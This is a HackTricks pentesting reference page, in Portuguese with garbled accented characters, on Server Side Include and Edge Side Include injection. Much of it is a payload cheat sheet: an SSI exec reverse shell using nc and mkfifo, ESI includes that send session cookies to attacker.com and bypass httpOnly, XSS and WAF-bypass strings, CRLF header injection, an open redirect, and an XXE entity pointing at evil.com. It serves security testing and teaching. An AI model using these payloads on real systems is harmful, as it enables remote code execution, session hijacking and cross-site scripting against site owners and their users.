# Server Side Inclusion/Edge Side Inclusion Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Server Side Inclusion Basic Information

**(Introdu√ß√£o retirada da [documenta√ß√£o do Apache](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Server Side Includes) s√£o diretivas que s√£o **colocadas em p√°ginas HTML e avaliadas no servidor** enquanto as p√°ginas est√£o sendo servidas. Elas permitem que voc√™ **adicione conte√∫do gerado dinamicamente** a uma p√°gina HTML existente, sem precisar servir a p√°gina inteira atrav√©s de um programa CGI ou outra tecnologia din√¢mica.\
Por exemplo, voc√™ pode colocar uma diretiva em uma p√°gina HTML existente, como:

`<!--#echo var="DATE_LOCAL" -->`

E, quando a p√°gina √© servida, esse fragmento ser√° avaliado e substitu√≠do pelo seu valor:

`Tuesday, 15-Jan-2013 19:28:54 EST`

A decis√£o de quando usar SSI e quando ter sua p√°gina totalmente gerada por algum programa geralmente √© uma quest√£o de qu√£o est√°tica √© a p√°gina e quanto precisa ser recalculado toda vez que a p√°gina √© servida. SSI √© uma √≥tima maneira de adicionar pequenas informa√ß√µes, como a hora atual - mostrada acima. Mas se a maior parte da sua p√°gina est√° sendo gerada no momento em que √© servida, voc√™ precisa procurar alguma outra solu√ß√£o.

Voc√™ pode inferir a presen√ßa de SSI se a aplica√ß√£o web usar arquivos com as extens√µes **`.shtml`, `.shtm` ou `.stm`**, mas n√£o √© apenas esse o caso.

Uma express√£o SSI t√≠pica tem o seguinte formato:
```
<!--#directive param="value" -->
```
### Verificar
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

H√° um problema **em armazenar em cache informa√ß√µes ou aplica√ß√µes din√¢micas**, pois parte do conte√∫do pode ter **variado** na pr√≥xima vez que o conte√∫do for recuperado. √â para isso que **ESI** √© usado, para indicar usando tags ESI o **conte√∫do din√¢mico que precisa ser gerado** antes de enviar a vers√£o em cache.\
se um **atacante** conseguir **injetar uma tag ESI** dentro do conte√∫do em cache, ent√£o, ele poder√° **injetar conte√∫do arbitr√°rio** no documento antes que seja enviado aos usu√°rios.

### Detec√ß√£o de ESI

O seguinte **cabe√ßalho** em uma resposta do servidor significa que o servidor est√° usando ESI:
```
Surrogate-Control: content="ESI/1.0"
```
Se voc√™ n√£o conseguir encontrar este cabe√ßalho, o servidor **pode estar usando ESI de qualquer forma**.\
Uma **abordagem de explora√ß√£o cega tamb√©m pode ser usada** j√° que uma solicita√ß√£o deve chegar ao servidor dos atacantes:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### Explora√ß√£o de ESI

[GoSecure criou](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) uma tabela para entender poss√≠veis ataques que podemos tentar contra diferentes softwares compat√≠veis com ESI, dependendo da funcionalidade suportada:

* **Includes**: Suporta a diretiva `<esi:includes>`
* **Vars**: Suporta a diretiva `<esi:vars>`. √ötil para contornar Filtros XSS
* **Cookie**: Cookies do documento s√£o acess√≠veis ao mecanismo ESI
* **Cabe√ßalhos Upstream Necess√°rios**: Aplica√ß√µes substitutas n√£o processar√£o declara√ß√µes ESI a menos que a aplica√ß√£o upstream forne√ßa os cabe√ßalhos
* **Lista de Permiss√£o de Hosts**: Neste caso, inclus√µes ESI s√≥ s√£o poss√≠veis a partir de hosts de servidor permitidos, tornando SSRF, por exemplo, apenas poss√≠vel contra esses hosts

|         **Software**         | **Includes** | **Vars** | **Cookies** | **Cabe√ßalhos Upstream Necess√°rios** | **Lista de Permiss√£o de Hosts** |
| :--------------------------: | :----------: | :------: | :---------: | :-------------------------------: | :-----------------------------: |
|            Squid3            |      Sim     |    Sim   |     Sim     |              Sim                  |              N√£o               |
|         Varnish Cache        |      Sim     |    N√£o    |      N√£o    |              Sim                  |              Sim               |
|            Fastly            |      Sim     |    N√£o    |      N√£o    |              N√£o                  |              Sim               |
| Akamai ESI Test Server (ETS) |      Sim     |    Sim   |     Sim     |              N√£o                  |              N√£o               |
|          NodeJS esi          |      Sim     |    Sim   |     Sim     |              N√£o                  |              N√£o               |
|         NodeJS nodesi        |      Sim     |    N√£o    |      N√£o    |              N√£o                  |           Opcional             |

#### XSS

A seguinte diretiva ESI carregar√° um arquivo arbitr√°rio dentro da resposta do servidor
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Bypass client XSS protection
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Roubar Cookie

* Roubo remoto de cookie
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* Roubar cookie HTTP\_ONLY com XSS refletindo-o na resposta:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Arquivo Local Privado

N√£o confunda isso com uma "Inclus√£o de Arquivo Local":
```markup
<esi:include src="secret.txt">
```
#### CRLF
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Open Redirect

O seguinte adicionar√° um cabe√ßalho `Location` √† resposta
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Adicionar Cabe√ßalho

* Adicionar cabe√ßalho na solicita√ß√£o for√ßada
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* Adicione cabe√ßalho na resposta (√∫til para contornar "Content-Type: text/json" em uma resposta com XSS)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF no cabe√ßalho Add (**CVE-2019-2438**)
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai debug

Isso enviar√° informa√ß√µes de depura√ß√£o inclu√≠das na resposta:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

Ao especificar o valor `xslt` para o par√¢metro _dca_, √© vi√°vel incluir **`eXtensible Stylesheet Language Transformations (XSLT)`** baseado em ESI. A inclus√£o faz com que o substituto HTTP recupere os arquivos XML e XSLT, sendo que o √∫ltimo filtra o primeiro. Esses arquivos XML s√£o explor√°veis para ataques de _XML External Entity (XXE)_, permitindo que atacantes executem ataques SSRF. No entanto, a utilidade dessa abordagem √© limitada, uma vez que ESI j√° serve como um vetor SSRF. Devido √† aus√™ncia de suporte na biblioteca subjacente Xalan, DTDs externos n√£o s√£o processados, impedindo a extra√ß√£o de arquivos locais.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
Arquivo XSLT:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Verifique a p√°gina XSLT:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### Refer√™ncias

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Lista de Detec√ß√£o de For√ßa Bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
